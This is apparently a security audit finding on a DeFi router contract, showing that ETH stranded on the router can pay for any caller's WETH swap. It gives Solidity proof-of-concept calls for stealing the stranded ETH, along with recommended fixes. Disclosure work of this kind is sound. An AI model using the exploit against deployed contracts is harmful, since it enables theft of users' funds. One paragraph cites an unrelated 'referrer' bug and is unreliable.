### Title
Router's Unattributed Native ETH Balance Is Consumed as WETH Payment by Any Caller, Enabling Theft of Stranded ETH - (File: metric-periphery/contracts/base/PeripheryPayments.sol)

---

### Summary

The `pay` function in `PeripheryPayments.sol` uses the router's entire native ETH balance to settle WETH swap payments without verifying that the ETH belongs to the current payer. Any ETH stranded on the router from a prior payable call can be consumed by an unrelated attacker who calls `exactInputSingle` (or any WETH-input swap) with `tokenIn = WETH`, receiving output tokens without spending any of their own WETH.

---

### Finding Description

The `pay` function contains three branches for WETH payments:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);          // payer pays NOTHING
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance); // payer pays partial
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value); // payer pays full
    }
}
``` [1](#0-0) 

When `nativeBalance >= value`, the router wraps its own ETH and sends it to the pool. The registered `payer`'s WETH is never pulled. The router's ETH balance is a shared, unattributed pool — there is no per-user accounting of who deposited which ETH.

Every public swap and liquidity function on the router is `payable`: [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

The `receive()` guard only blocks direct bare ETH transfers; it does **not** block `msg.value` attached to any of these function calls: [6](#0-5) 

ETH becomes stranded on the router whenever:
- A user sends `msg.value > 0` with a non-WETH swap (e.g., `exactInputSingle(tokenA→tokenB)` with `msg.value = X`).
- A user sends more ETH than `amountIn` for a WETH swap.
- A user forgets to append `refundETH()` to their `multicall`.

Once stranded, the ETH is immediately claimable by any caller who submits a WETH-input swap for exactly that amount.

The analog to the external referrer bug is direct: in the referrer system, having a referrer (even a self-controlled one) always yields a higher total reward than not having one. Here, having ETH pre-loaded on the router always yields a lower (zero) out-of-pocket WETH cost for the attacker. Just as users could self-refer to capture the bonus, an attacker can self-strand ETH via one payable call and then reclaim it as swap output — or, more profitably, wait for a victim to strand ETH and steal it.

---

### Impact Explanation

**Severity: High**

Any ETH stranded on the router is directly and immediately claimable by any address that calls `exactInputSingle` (or `exactInput`, `exactOutputSingle`, `exactOutput`) with `tokenIn = WETH`. The attacker receives output tokens worth the full stranded ETH amount while paying zero WETH from their own wallet. This is a direct, complete loss of the victim's principal with no recovery path.

---

### Likelihood Explanation

**Likelihood: High**

- All swap and liquidity functions are `payable`, so users routinely attach `msg.value` for WETH swaps.
- Over-funding (sending more ETH than `amountIn`) or forgetting `refundETH()` in a multicall are common user errors.
- No on-chain guard prevents a non-WETH swap from being called with `msg.value > 0`.
- The exploit requires no special permissions, no flash loan, and no complex setup — a single `exactInputSingle` call suffices.
- MEV bots can monitor the mempool for transactions that strand ETH and front-run the victim's `refundETH`.

---

### Recommendation

1. **Track per-call ETH in transient storage.** Record `msg.value` in a transient slot at the start of each payable entry point and consume only that amount in `pay`. Revert if `msg.value` is non-zero and `tokenIn != WETH`.

2. **Enforce exact ETH consumption.** After the swap callback, assert `address(this).balance == 0` (or equals the pre-call balance) and revert otherwise, forcing users to include `refundETH()` or send exact ETH.

3. **Restrict `pay` to `msg.value` of the current call.** Pass the per-call ETH budget as a parameter through the callback context (transient storage) and cap the ETH consumed in `pay` to that budget, ignoring any pre-existing router balance.

---

### Proof of Concept

**Step 1 — Victim strands ETH (non-WETH swap with msg.value):**

```solidity
// Victim calls exactInputSingle for a tokenA→tokenB swap but accidentally attaches 10 ETH.
router.exactInputSingle{value: 10 ether}(ExactInputSingleParams({
    pool:             poolAB,
    tokenIn:          tokenA,   // NOT WETH
    tokenOut:         tokenB,
    zeroForOne:       true,
    amountIn:         1000e18,
    amountOutMinimum: 0,
    recipient:        victim,
    deadline:         block.timestamp + 1,
    priceLimitX64:    0,
    extensionData:    ""
}));
// 10 ETH now sits unattributed on the router.
```

**Step 2 — Attacker steals the stranded ETH via a WETH swap:**

```solidity
// Attacker calls exactInputSingle for a WETH→tokenC swap with msg.value = 0.
// amountIn is set to exactly the router's ETH balance (10 ETH).
router.exactInputSingle{value: 0}(ExactInputSingleParams({
    pool:             poolWETH_C,
    tokenIn:          WETH,     // triggers the ETH branch in pay()
    tokenOut:         tokenC,
    zeroForOne:       true,
    amountIn:         10 ether, // matches router's stranded ETH
    amountOutMinimum: 0,
    recipient:        attacker,
    deadline:         block.timestamp + 1,
    priceLimitX64:    0,
    extensionData:    ""
}));
// During metricOmmSwapCallback → _justPayCallback → pay(WETH, attacker, pool, 10e18):
//   nativeBalance (10 ETH) >= value (10 ETH)  →  router wraps 10 ETH, sends WETH to pool.
//   Attacker's own WETH is never touched.
//   Attacker receives tokenC worth 10 ETH. Victim's 10 ETH is gone.
``` [7](#0-6) [8](#0-7)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L69-88)
```text
  function pay(address token, address payer, address recipient, uint256 value) internal {
    // If the payer is contract it means we are in the middle of a path. In the middle of a path we operate on ERC20 only.
    if (payer == address(this)) {
      IERC20(token).safeTransfer(recipient, value);
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-67)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L92-92)
```text
  function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-130)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L154-154)
```text
  function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```
